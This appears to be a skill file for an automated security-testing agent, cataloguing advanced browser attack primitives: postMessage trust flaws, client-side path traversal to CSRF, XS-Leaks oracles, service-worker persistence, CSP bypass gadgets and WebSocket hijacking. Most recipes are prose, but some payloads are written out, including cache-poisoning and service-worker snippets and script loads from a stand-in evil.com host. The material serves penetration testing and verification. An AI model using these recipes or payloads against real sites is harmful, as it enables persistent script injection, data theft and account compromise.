---
name: browser-security-advanced-deep
description: Advanced browser-security exploitation — postMessage patterns, CSPT2CSRF, XS-Leaks oracle depth, service-worker scope confusion, named-window collision, CSP bypass gadgets, DIP vs COOP/COEP, navigation oracles, protocol-handler abuse
sibling: browser_security
load_when: scan_mode == "deep"
---

# Browser Security — Advanced Deep

Full technique treatments for browser-security exploitation beyond the base skill. The base owns the state model, oracle inventory, and framework-specific CSPT framing; this file owns per-primitive Primitive / Preconditions / Attack recipe / Confirmation / Impact at depth. Load `browser_security_novel_deep` for the 2024–2026 verified-CVE catalog, measured frontier primitives (DIP, DoubleClickjacking, novel XS-Leaks oracles), and open-problem framing.

Browser primitives are state-machine primitives. Each treatment below names the preconditioned state, the transition triggered by attacker control, and the observable or capability transferred downstream.

## postMessage Primitive Depth

### Primitive: Missing Origin Check Full-Pwn

**Primitive**: a message listener acts on `event.data` without verifying `event.origin`. Any origin that can obtain a reference to the target window can send a message that triggers the sensitive action.

**Preconditions**:
- Target window is reachable (named context, popup, iframe) from attacker's origin.
- Listener performs sensitive action (DOM write, API call, navigation) based on message content.
- No origin check or weak check (`event.origin.includes("trusted")`).

**Attack recipe**:
1. Enumerate message listeners (DevTools "Event Listeners" panel; source review for `addEventListener('message', ...)`).
2. Craft a message schema matching the listener's expected format.
3. From an attacker-controlled origin, obtain the target window reference (frame, popup, opener).
4. Send message; listener acts.

**Confirmation**: targeted DOM mutation, API call, or navigation occurs with no legitimate user interaction.

**Impact**: full UI control; load `xss` for the sanitization chain, `csrf` for the sensitive action class.

### Primitive: Weak-Origin-Check Substring

**Primitive**: `event.origin.includes("example.com")` or regex `.*\.example\.com$` matches attacker domains like `evil-example.com` or `example.com.attacker.com`.

**Preconditions**:
- Origin check uses `includes`, `startsWith`, or weak regex rather than `event.origin === "https://example.com"`.

**Attack recipe**:
1. Analyze the regex/string match.
2. Register or use an attacker-controlled subdomain or similar domain that passes the match.
3. Send message.

**Confirmation**: listener acts under attacker's origin.

**Impact**: cross-origin postMessage, bypassing weak origin check.

### Primitive: Source-Reference Trust Without Validation

**Primitive**: listener trusts `event.source` based on reference equality, but the reference was captured from an attacker-controlled window.open.

**Preconditions**:
- Listener stored a window reference at some earlier point.
- Attacker-controlled interaction (user clicked a popup link controlled by attacker, user navigated an iframe).

**Attack recipe**:
1. Observe the window-reference-capture pattern.
2. Replace the trusted window with attacker-controlled one via COOP violation or opener-chain manipulation.
3. Send message.

**Confirmation**: `event.source` equals attacker's window.

**Impact**: source-based trust defeated; message acts.

### Primitive: isTrusted Flag Not Checked

**Primitive**: synthetic `MessageEvent` via `dispatchEvent` can lie about origin; `event.isTrusted === false` identifies synthetic events.

**Preconditions**:
- Listener does not check `event.isTrusted`.
- Attacker has in-page JS (via XSS) that dispatches synthetic events to internal listeners.

**Attack recipe**:
1. From the attacker's XSS context, dispatch a synthetic MessageEvent with `origin` set to a trusted value.
2. Listener acts without noticing the synthetic nature.

**Confirmation**: listener invoked with attacker-chosen "origin" via synthetic event.

**Impact**: cross-component trust defeat; XSS escalation to internal-only functions.

### Primitive: PostMessage Broadcast

**Primitive**: a target page's `postMessage("*", ...)` leaks the message to any listener on the browser-reachable context. Attacker iframe listens and captures.

**Preconditions**:
- Target broadcasts with `targetOrigin = "*"`.
- Content of message is sensitive (session info, user data, tokens).
- Attacker can frame the target or share a browsing context.

**Attack recipe**:
1. Iframe the target.
2. Listen for `message` events on the parent.
3. Target broadcasts; attacker receives.

**Confirmation**: message content captured in attacker's iframe listener.

**Impact**: cross-origin data exfiltration without an XSS primitive.

## Client-Side Path Traversal at Depth

### Primitive: CSPT1 — Response-Reading

**Primitive**: client-side URL construction `fetch("/api/" + userInput)` where `userInput` contains `..` reaches an unintended endpoint; the response is rendered or processed.

**Preconditions**:
- URL constructed by string concatenation (not URL constructor with path containment).
- `userInput` reaches the construction without canonicalization.
- Endpoint returns data the attacker wants to see.

**Attack recipe**:
1. Identify the fetch construction.
2. Submit `userInput = "../admin/secrets"`.
3. The fetch reaches `/api/../admin/secrets` → `/admin/secrets` after URL normalization.
4. Response renders in client; attacker reads.

**Confirmation**: response from unintended endpoint rendered in client UI.

**Impact**: unauthorized data read; functionally equivalent to IDOR with a client-side path primitive.

### Primitive: CSPT2CSRF — State-Changing

**Primitive**: a CSPT primitive reaches a state-changing API; because the client-triggered fetch is same-origin and credentialed, no CSRF defense (same-origin check, token) blocks it.

**Preconditions**:
- CSPT primitive reaches a state-changing API (POST, PUT, DELETE).
- API trusts same-origin requests (SameSite cookie) without additional CSRF token.

**Attack recipe**:
1. Identify the CSPT primitive's reach to a state-changing API.
2. Craft `userInput` that steers the fetch to the state-changing endpoint.
3. Victim navigates to the attacker-chosen URL (via link, redirect, iframe navigation).
4. Client-side JS makes credentialed fetch to the state-changing endpoint — CSRF primitive from a client-side path primitive.

**Confirmation**: state change occurred under victim's identity with no explicit CSRF-posting form.

**Impact**: full CSRF without a traditional CSRF form; defeats SameSite because the fetch is same-origin. Load `csrf` for broader class.

### Primitive: CSPT via Hash/Fragment

**Primitive**: `location.hash` is user-controlled; a router using the hash for state can reach a different route than the URL path suggests.

**Preconditions**:
- Router consumes `window.location.hash`.
- Hash reaches `fetch` construction.

**Attack recipe**:
1. Craft a URL `https://target/page#../admin`.
2. Router reads hash, constructs fetch URL.
3. Fetch reaches `/admin`.

**Confirmation**: fetch URL in Network tab shows unintended path.

**Impact**: same as path-based CSPT.

### Primitive: CSPT in File-Upload Context

**Primitive**: a file-upload UI constructs the storage URL from the filename; attacker-crafted filename reaches an unintended storage location.

**Preconditions**:
- Filename supplied by user becomes part of the storage URL.
- Backend trusts the client-supplied URL.

**Attack recipe**:
1. Upload a file named `../other-user-space/myfile.txt`.
2. Client constructs URL `s3://bucket/user-{id}/../other-user-space/myfile.txt`.
3. If the backend trusts the URL path, upload lands in other-user-space.

**Confirmation**: file visible in unintended location.

**Impact**: cross-user data write; load `insecure_file_uploads`.

## XS-Leaks Oracle Depth

Each oracle in the base is a template; the depth is in signal quality and chain to impact.

### Primitive: Error Event vs Load Event

**Primitive**: a cross-origin `<img>`, `<script>`, or `<iframe>` fires `onload` for a 200 response and `onerror` for a 4xx; targeted state determines status.

**Preconditions**:
- Resource is loadable (not blocked by CORB/ORB).
- Status varies by target state.
- Target page does not disrupt the differential (same-content error pages).

**Attack recipe**:
1. Choose a resource whose status differs by state (e.g., `/profile/private` returns 403 unauth and 200 auth).
2. From attacker page, embed `<script src="/profile/private">`.
3. `onload` fires if user is authenticated; `onerror` if not.

**Confirmation**: attacker observes event in cross-origin test.

**Impact**: state oracle revealing authentication status, group membership, resource ownership.

### Primitive: Frame-Count Oracle

**Primitive**: `window.length` returns the number of child frames; targeted state causes different frame counts.

**Preconditions**:
- Target page framable.
- Target has state-dependent frames.

**Attack recipe**:
1. Open target in cross-origin iframe.
2. Read `iframe.contentWindow.length`.
3. Separate authenticated (count=5, including dashboard widgets) and unauthenticated (count=2, login form only).

**Confirmation**: measured frame count differs by control case.

**Impact**: authentication-state oracle; load `csrf` for impact when combined.

### Primitive: ID Attribute Focus Event

**Primitive**: navigating a cross-origin iframe to `#elem_id` causes focus events observable from parent; the element's presence reveals state.

**Preconditions**:
- Target has ID-indexed elements per state.
- Iframe loads target.
- Parent can observe focus events on itself.

**Attack recipe**:
1. Open target in iframe.
2. Set `iframe.src = target_url + "#admin_panel"`.
3. If `admin_panel` exists (user is admin), focus event fires; if not, no event.

**Confirmation**: focus observable in parent.

**Impact**: fine-grained state oracle; role/permission detection.

### Primitive: Cache Probing Timing

**Primitive**: a cross-origin fetch of a resource that may or may not be in cache; cache-hit returns in ~0ms, cache-miss in network RTT.

**Preconditions**:
- Resource is cacheable.
- Prior visits populate cache for target state.
- Attacker page can measure timing.

**Attack recipe**:
1. Attacker page records baseline timing for known-uncached resource.
2. Fetch target resource; measure.
3. Below baseline → cached → user visited target; above → not cached.

**Confirmation**: measured timing bimodal (cached ~5ms, uncached ~200ms).

**Impact**: history-leak oracle; reveals site visits.

### Primitive: Connection Pool Timing

**Primitive**: Chromium's 256-connection-per-host limit; attacker exhausts the pool and times reuse.

**Preconditions**:
- Target reachable; attacker can open many concurrent connections.
- Lexicographic sort of hosts matters for the connection assignment.

**Attack recipe**:
1. Attacker opens 255 fetches to `attacker.com` (same host, held open).
2. Victim's browser has 1 slot left for `attacker.com`.
3. Attacker fetches `attacker.com/A` and times.
4. If victim just made a request to a sibling host that sorts alphabetically close, the connection reuse differs.

**Confirmation**: timing-separated connection availability reveals target state.

**Impact**: cross-origin subdomain/host leak.

## Service Worker Depth

### Primitive: Service-Worker Scope Confusion

**Primitive**: a service worker registered at `/users/attacker/` is reinterpreted by the browser to control `/users/attacker-with-wider-prefix/` due to scope-prefix matching.

**Preconditions**:
- Attacker can register a service worker.
- Scope prefix extends to victim-controlled territory.

**Attack recipe**:
1. Attacker uploads `/users/attacker/sw.js`.
2. Browser registers worker with scope `/users/attacker/`.
3. If scope matching is loose, worker intercepts `/users/attacker-public/` territory.

**Confirmation**: fetches to victim-adjacent paths intercepted by attacker-worker.

**Impact**: cross-user intercept.

### Primitive: Cache API Poisoning via XSS

**Primitive**: an XSS primitive writes to `caches.open(name)` with attacker content; subsequent legitimate fetches serve from cache.

**Preconditions**:
- Initial XSS primitive.
- Application reads from Cache API before fetching network.

**Attack recipe**:
1. XSS payload: `caches.open('v1').then(c => c.put('/safe-script.js', new Response('alert(1)', {headers: {'Content-Type': 'application/javascript'}})))`.
2. Legitimate page loads `/safe-script.js`; reads from cache; executes attacker payload.

**Confirmation**: payload executes on later legitimate page load.

**Impact**: persistent XSS surviving the initial injection point patch.

### Primitive: Service Worker Persistence

**Primitive**: a service worker registered during XSS persists; the vulnerable injection point is patched, but the worker continues to intercept.

**Preconditions**:
- Service worker registration via XSS.
- Worker scope includes future legitimate pages.
- Worker's `fetch` handler injects script or redirects.

**Attack recipe**:
1. XSS payload registers `/sw.js` at `/`.
2. Vulnerability patched; XSS no longer works.
3. Worker still controls all pages at `/`; its fetch handler injects script into every load.

**Confirmation**: fetch-handler intercepts and modifies responses.

**Impact**: patch-surviving XSS; load `xss` for the broader class.

## CSP Bypass Gadgets

### Primitive: Nonce Reflection via Dangling Markup

**Primitive**: CSP uses `nonce-ABC123`; attacker injects content that references the nonce via DOM clobbering, iframe srcdoc, or dangling markup.

**Preconditions**:
- CSP nonce reused across requests (not per-request).
- Attacker-controlled injection point.

**Attack recipe**:
1. Inject `<img src="x" onerror="document.write('<script nonce=\"' + ...)"`.
2. Dangling markup consumes the nonce.
3. New script with the stolen nonce executes.

**Confirmation**: CSP permits the injected script.

**Impact**: CSP bypass; XSS execution.

### Primitive: strict-dynamic Gadget

**Primitive**: `strict-dynamic` CSP allows scripts loaded by trusted scripts; attacker finds a trusted script that loads attacker-controlled URL.

**Preconditions**:
- CSP uses `strict-dynamic`.
- A trusted script (nonce or hash-allowlisted) can load attacker-chosen URL.

**Attack recipe**:
1. Identify a trusted script that uses `document.write(script-url)` or JSONP.
2. Inject input that makes the trusted script load attacker URL.
3. Attacker script executes under `strict-dynamic`.

**Confirmation**: attacker script executed despite CSP.

**Impact**: CSP bypass; load `xss`.

### Primitive: base-uri Rewrite

**Primitive**: `<base href>` is injectable; relative URLs resolve against the attacker-chosen base.

**Preconditions**:
- CSP does not include `base-uri` directive.
- Attacker can inject `<base>` tag.

**Attack recipe**:
1. Inject `<base href="https://evil.com/">`.
2. Subsequent relative URLs (`<script src="app.js">`) resolve to `evil.com/app.js`.

**Confirmation**: relative URL fetches land at attacker domain.

**Impact**: CSP bypass; script injection via rewriting.

### Primitive: Trusted Types Bypass

**Primitive**: Trusted Types forces type-safe DOM-write APIs; attacker finds a legacy DOM API not covered.

**Preconditions**:
- Trusted Types enforced.
- Legacy or framework-internal API uses raw string injection.

**Attack recipe**:
1. Enumerate DOM sinks for coverage gaps.
2. Find framework-internal `innerHTML` not routed through policy.
3. Inject via that path.

**Confirmation**: injection succeeds despite Trusted Types.

**Impact**: Trusted Types bypass; XSS.

## Cross-Origin Isolation and DIP

### Primitive: COOP+COEP Missing on Sensitive App

**Primitive**: an app with sensitive data (financial dashboard, auth-gated content) lacks COOP+COEP; it is still Spectre-exposed and lacks several XS-Leaks defenses.

**Preconditions**:
- Headers absent on the sensitive routes.
- Browser older than DIP support.

**Attack recipe**: Spectre-adjacent reads are possible from attacker iframe; multiple XS-Leaks oracles active.

**Confirmation**: `self.crossOriginIsolated === false`.

**Impact**: wider XS-Leaks attack surface; Spectre-adjacent reads potentially possible.

### Primitive: Document Isolation Policy (DIP) Chrome 137+

**Primitive**: Chrome 137 shipped DIP as a per-frame alternative to COOP+COEP; subframes don't need COEP. Compatibility impact: still requires same-origin or CORS/CORP-covered subresources, but subframes without COEP are permitted.

**Preconditions**:
- App on Chrome 137+ (May 2025 or later).
- App wants cross-origin isolation without forcing subframes.

**Attack recipe**: not an attack per se; a configuration primitive. For attack: a page using DIP in Chrome 137+ is isolated; attempts to coerce lower isolation would be a config attack.

**Confirmation**: `document.isolationPolicy` or `self.crossOriginIsolated` reflects DIP state.

**Impact**: DIP is a defensive primitive; absence of DIP (or COOP+COEP) is the finding.

### Primitive: Opener-Chain Severance Verification

**Primitive**: when crossing cross-origin isolation, `window.opener` is severed; attacker tests whether severance is enforced.

**Preconditions**:
- Isolation configuration ambiguous.

**Attack recipe**:
1. Navigate to a page that transitions isolation state.
2. Check `window.opener`.

**Confirmation**: opener null-vs-defined differs by isolation state.

**Impact**: configuration auditing primitive.

## Named Window Collision at Depth

### Primitive: Pre-Registration of Named Window

**Primitive**: a target creates a named popup `window.open(url, "chat")`. Attacker, visiting a page before the target, pre-registers "chat" with attacker-controlled content.

**Preconditions**:
- Target name is predictable (literal string, derivable).
- Attacker's page is open in the same browser profile.
- No COOP same-origin-allow-popups to isolate.

**Attack recipe**:
1. Attacker's page opens a context named "chat" with `window.open("attacker.com", "chat")`.
2. Later, victim visits target; target's `window.open(url, "chat")` reuses the existing context.
3. Target's URL loads in attacker-pre-registered context.

**Confirmation**: target content loads into a context the attacker's page can still reference.

**Impact**: cross-origin content injection; attacker reads/modifies after target loads.

## Protocol Handler Abuse

### Primitive: OS Protocol Handler Arg Smuggling

**Primitive**: a URL like `vscode://file/../../attacker-chosen-path` passes to the OS-registered handler; parameter parsing differs between browser URL parser and handler.

**Preconditions**:
- OS handler registered.
- Handler accepts URL parameters.
- Browser navigation to the URL is permitted.

**Attack recipe**:
1. Enumerate OS handlers (`vscode:`, `cursor:`, `claude:`, `obsidian:`).
2. Craft a URL that passes benign-looking parameters to the handler.
3. Victim's browser navigates to the URL (via link, redirect).
4. Handler parses parameters and takes attacker-chosen action.

**Confirmation**: application performs attacker-chosen action.

**Impact**: depends on handler; load `agentic_system_security` if handler launches an agent application.

## Fetch Metadata and Sec-Fetch-* Depth

### Primitive: Sec-Fetch-Dest Trust

**Primitive**: a server trusts `Sec-Fetch-Dest` to identify request type (e.g., only allows HTML load for `dest=document`, blocks `dest=script`); attacker finds a path to make the browser set the "trusted" dest.

**Preconditions**:
- Server-side check on `Sec-Fetch-Dest`.
- Attacker can control the embedding tag.

**Attack recipe**:
1. Normally, `<script src="target">` sends `Sec-Fetch-Dest: script`.
2. If server rejects for scripts but accepts for `document`, attacker frames the target as `<iframe>` which sends `dest=iframe`.
3. Server trusts the dest.

**Confirmation**: audit log shows unexpected `Sec-Fetch-Dest` value accepted.

**Impact**: fetch-type gating bypassed.

### Primitive: Sec-Fetch-Mode Signaling

**Primitive**: `Sec-Fetch-Mode: navigate` vs `cors` vs `no-cors` vs `same-origin` signals the mode of the request; servers may use it for routing.

**Preconditions**:
- Server-side routing or policy based on `Sec-Fetch-Mode`.

**Attack recipe**:
1. Enumerate server behavior per mode.
2. Find mode that bypasses policy.
3. Craft request to produce that mode (iframe for navigate, fetch for cors).

**Confirmation**: policy differs by mode.

**Impact**: policy-routing bypass.

### Primitive: Sec-Fetch-Site: cross-site Treated as same-origin

**Primitive**: a service worker in the target origin intercepts cross-site fetches and re-issues them, altering `Sec-Fetch-Site` to `same-origin`.

**Preconditions**:
- Service worker in target origin.
- Server trusts `Sec-Fetch-Site: same-origin` for CSRF protection.

**Attack recipe**:
1. Victim's browser has service worker.
2. Cross-site attacker fetches target; worker intercepts.
3. Worker re-issues; `Sec-Fetch-Site: same-origin` (since worker is same-origin to target).
4. Server treats as same-origin request.

**Confirmation**: audit log shows same-origin for a cross-site-triggered request.

**Impact**: CSRF-defense bypass via service worker.

## Iframe Sandbox Depth

### Primitive: allow-same-origin + allow-scripts Full Escape

**Primitive**: `<iframe sandbox="allow-same-origin allow-scripts" src="target.html">` loads target same-origin + runs scripts. If attacker controls content served at target.html path (via XSS or same-origin upload), the sandboxed script runs with full same-origin access.

**Preconditions**:
- Iframe sandbox includes both tokens.
- Attacker-controlled content loadable at the src.

**Attack recipe**:
1. Enumerate iframes with the token combination.
2. Upload or inject content at the src.
3. Attacker script runs with same-origin access.

**Confirmation**: sandboxed script makes same-origin fetches successfully.

**Impact**: sandbox providing no real isolation; equivalent to no sandbox.

### Primitive: Sandbox srcdoc Attribute

**Primitive**: `<iframe sandbox="allow-scripts" srcdoc="<script>...</script>">` runs attacker-content; if attacker controls `srcdoc` via injection, arbitrary script runs.

**Preconditions**:
- Injection into HTML allowing `<iframe srcdoc>`.
- Sandbox excludes `allow-same-origin` (so same-origin is still restricted) but allows scripts.

**Attack recipe**:
1. Inject `<iframe sandbox="allow-scripts" srcdoc="...">`.
2. Attacker script runs; some operations still blocked (no same-origin), but window-opening, redirects, and sensor APIs work.

**Confirmation**: script in srcdoc executes.

**Impact**: constrained but non-zero attacker code execution.

### Primitive: Sandbox Nested Expansion

**Primitive**: a sandboxed iframe loads a child iframe; the child inherits the parent's sandbox but may inadvertently gain missing capabilities.

**Preconditions**:
- Nested iframe structure.
- Child iframe loads from a different context.

**Attack recipe**:
1. Attacker's sandboxed iframe loads a child.
2. Child's inherited sandbox may differ from attacker-set.

**Confirmation**: child's effective sandbox differs from expected.

**Impact**: capability expansion through nesting.

## Service Worker Fetch Handler Attacks

### Primitive: Service Worker Request Rewriting

**Primitive**: `event.respondWith(fetch(event.request))` is the simplest pass-through, but a worker that rewrites the request can mutate URL, headers, or body, defeating origin-based or path-based security checks.

**Preconditions**:
- Service worker has a `fetch` handler.
- Attacker controls the worker (via XSS registration or compromised third-party).

**Attack recipe**:
1. Worker's handler: `event.respondWith(fetch(event.request.url.replace('/api/', '/admin/')))`.
2. Legitimate page's API calls land at admin endpoints.

**Confirmation**: audit log shows calls to admin from a user context.

**Impact**: client-side URL rewriting bypassing policy.

### Primitive: Service Worker Response Fabrication

**Primitive**: `event.respondWith(new Response('malicious', {status: 200}))` returns attacker-authored content without a network request. The page processes attacker content.

**Preconditions**:
- Worker has fetch handler.
- Content processed by page is script, HTML, or data acted on.

**Attack recipe**:
1. Worker returns malicious JSON that overrides a config endpoint.
2. Page processes config; executes attacker-chosen behavior.

**Confirmation**: no network request for the fetched URL; content differs from server's actual response.

**Impact**: client-side content substitution; persistent XSS equivalent.

## More XS-Leaks Primitives

### Primitive: Error Page Dimensions

**Primitive**: 400/500 pages have different dimensions than content pages; `<iframe>` dimensions or scroll position reveals which.

**Preconditions**:
- Error page content differs in size.
- Attacker can measure iframe scrollable area.

**Attack recipe**:
1. Open target in iframe.
2. Measure `iframe.contentWindow.innerHeight` or scroll calculations.
3. Signal differs by error vs content.

**Confirmation**: dimension measurement differs by state.

**Impact**: coarse state oracle.

### Primitive: Browser-Generated Error Pages

**Primitive**: Chrome's `net::ERR_FAILED` error page is distinguishable from a 400 response; the browser's error UI replaces the document, measurable via navigation events.

**Preconditions**:
- Target returns different error types by state.

**Attack recipe**:
1. Navigate target in attacker-controlled iframe.
2. If `net::ERR_*`, the browser shows its own page; `iframe.contentDocument` is null due to origin.
3. If 400 from server, iframe loads the error page; `contentDocument` is non-null.

**Confirmation**: contentDocument accessibility differs.

**Impact**: coarse but reliable state oracle.

### Primitive: Resource Dimensions

**Primitive**: an image's dimensions are loadable cross-origin via `img.naturalWidth`; different user states may serve different images.

**Preconditions**:
- Target serves different image dimensions by state.

**Attack recipe**:
1. Load image; measure `naturalWidth`.
2. Width differs by target state.

**Confirmation**: measured width differs.

**Impact**: coarse state oracle.

### Primitive: History-Length Leak

**Primitive**: `history.length` across navigations may reveal prior-session navigation count; cross-origin measurement is restricted but same-origin navigation chains can reveal.

**Preconditions**:
- Target's navigation history has state-dependent entries.

**Attack recipe**:
1. Trigger navigation sequence.
2. Measure `history.length`.
3. State-dependent entries change the count.

**Confirmation**: history.length differs across states.

**Impact**: fine state oracle.

## CSP Depth

### Primitive: nonce Reuse Across Requests

**Primitive**: CSP uses `nonce-ABC123` on an unchanging value across many requests; attacker reads the nonce from one response and reuses on another.

**Preconditions**:
- Nonce not rotated per-request.
- Attacker can read a response (via XS-Leak or legitimate access).

**Attack recipe**:
1. Attacker reads nonce from response R1.
2. Craft payload with the known nonce.
3. Submit injection to request R2; nonce matches; script executes.

**Confirmation**: injected script with stolen nonce runs.

**Impact**: CSP bypass; XSS execution.

### Primitive: hash CSP with Trailing-Whitespace

**Primitive**: CSP uses `hash-SHA256-XYZ` for a specific script; whitespace at script boundaries matters; attacker injects script with matching hash via whitespace tricks.

**Preconditions**:
- Hash CSP in place.
- Trailing whitespace in script content tolerated.

**Attack recipe**:
1. Compute hash of allowed script.
2. Inject the exact allowed script content via DOM; invoke custom behavior via the script's own functionality.

**Confirmation**: hash matches; script executes.

**Impact**: tight hash-based CSP has limited bypass surface; this is a niche primitive.

### Primitive: wildcard sources

**Primitive**: `script-src https:` or `script-src *` effectively allows any HTTPS URL; attacker loads attacker-hosted script.

**Preconditions**:
- Overly broad CSP source directive.

**Attack recipe**:
1. Inject `<script src="https://evil.com/payload.js">`.
2. CSP accepts.

**Confirmation**: script loaded from evil.com.

**Impact**: CSP providing minimal protection.

### Primitive: data: URL Script Injection

**Primitive**: CSP allows `script-src data:`; attacker encodes script in a data URL.

**Preconditions**:
- CSP includes `data:` in script-src.

**Attack recipe**:
1. Inject `<script src="data:application/javascript,alert(1)">`.
2. Script executes.

**Confirmation**: alert fires.

**Impact**: trivial CSP bypass if data: allowed.

## Chaining Depth

Advanced browser primitives chain into:

- **CSPT → CSRF**: `csrf_advanced_deep` for the state-change class.
- **postMessage weakness → XSS**: `xss_advanced_deep` for DOM-sink chain.
- **Service-worker persistence → long-lived XSS**: `xss` for the broader class.
- **XS-Leaks → authentication oracle → account enumeration + credential stuffing**: `weak_password_detection` for the downstream.
- **DIP absence → Spectre-adjacent + XS-Leaks surge**: this skill for XS-Leaks catalog.
- **DNS rebinding + loopback service → agentic compromise**: `agentic_system_security_advanced_deep` for the MCP class.
- **CSP bypass → XSS**: `xss_advanced_deep`.
- **Cross-origin iframe redirect → open redirect**: `open_redirect`.
- **Named window collision → cross-origin credentialed action**: `csrf` for the broader credentialed-flow class.
- **Click-jacking + sensitive-action → CSRF-equivalent**: `csrf`.

## WebSocket, WebRTC, and WebTransport Depth

### Primitive: Cross-Site WebSocket Hijacking (CSWSH)

**Primitive**: a WebSocket server does not check `Origin` header on upgrade; attacker's page can open credentialed WebSocket connection.

**Preconditions**:
- WebSocket endpoint uses cookies for auth.
- Server does not validate Origin on upgrade.

**Attack recipe**:
1. Victim is authenticated to target; cookie present.
2. Attacker's page opens `new WebSocket('wss://target/ws')`.
3. Browser includes cookies on the upgrade request.
4. Server accepts; attacker's JS now has a credentialed WebSocket.
5. Attacker sends commands over the WebSocket; server executes as victim.

**Confirmation**: WebSocket established; commands executed.

**Impact**: full WebSocket API access as victim.

### Primitive: Private Network Access Does Not Cover WebSockets

**Primitive**: Private Network Access (PNA) adds preflight for private-IP fetches, but WebSockets are exempt; attacker's public page can `wss://192.168.x.x/` without preflight.

**Preconditions**:
- Internal WebSocket service on private IP.
- Victim's browser can resolve the private IP.

**Attack recipe**:
1. Public attacker page opens WebSocket to internal service.
2. No preflight; connection succeeds.
3. If service uses cookies, cross-site hijacking also applies.

**Confirmation**: internal service reached from public page.

**Impact**: SSRF-like primitive from a browser; load `ssrf` for broader class.

### Primitive: WebRTC STUN Internal-IP Leak

**Primitive**: WebRTC's STUN candidate gathering exposes local IPs; cross-origin JS can enumerate the user's internal network.

**Preconditions**:
- WebRTC supported and permitted.

**Attack recipe**:
1. Create RTCPeerConnection; add STUN server.
2. Enumerate ICE candidates from `onicecandidate` event.
3. Local-network candidates reveal internal IPs.

**Confirmation**: internal IP addresses in ICE candidate list.

**Impact**: reconnaissance primitive revealing internal network topology.

## Measurement Discipline

A browser-security finding earns rigor from measurement:

- **Oracle quantification**: measure the signal (timing, dimension, count) across N trials for both success and failure control cases. Report separation and noise.
- **Browser-matrix table**: Chrome X.Y, Firefox X.Y, Safari X.Y — each with observed behavior.
- **Interaction minimization**: identify the smallest user interaction that triggers the primitive. "Zero-click" is strong; "double-click within 500ms" is weaker.
- **Isolation state**: `self.crossOriginIsolated`, Document.policy, CSP, X-Frame-Options — the exact header set at exploit time.
- **Reproduce in a fresh profile**: avoid false positives from leftover state.

A finding without a measurement is a lead; agents can produce measured oracle values via headless Chromium/Playwright in CI-safe conditions.

## Verification Discipline

For an advanced-tier browser-security finding:

1. **Browser version matrix**: Chrome, Firefox, Safari (desktop + mobile), with specific version numbers.
2. **Interaction requirements**: zero-click, single-click, click+hover, keyboard combo — be precise.
3. **Isolation state at exploit time**: `self.crossOriginIsolated` value; COOP/COEP/DIP headers.
4. **Measurement**: for timing-based oracles, quantify separation and noise (success at X ms ± Y ms, failure at W ms ± Z ms).
5. **Reproducibility**: fresh profile; synthetic test tenant; recording of the exact event sequence.
6. **Browser-config independence**: does the finding reproduce with default settings? Or does it require specific flag?
7. **Chain to impact**: a bare primitive is not a finding — show the authorization or data-exposure chain.

## Summary

Advanced browser exploitation is state-machine exploitation at the context-and-worker level: postMessage trust, CSPT and CSPT2CSRF, XS-Leaks oracles with quantified signal, service-worker scope and persistence, CSP bypass gadgets, cross-origin isolation state, named-window collision, and protocol-handler abuse. Each primitive is a specific state transition observable from an attacker-controlled context; chaining requires naming the capability transferred downstream (`xss`, `csrf`, `open_redirect`, `agentic_system_security`). For the 2024–2026 verified CVE catalog (CSPT CVEs, DNS rebinding, novel XS-Leaks oracles, DoubleClickjacking, DIP), load `browser_security_novel_deep`.
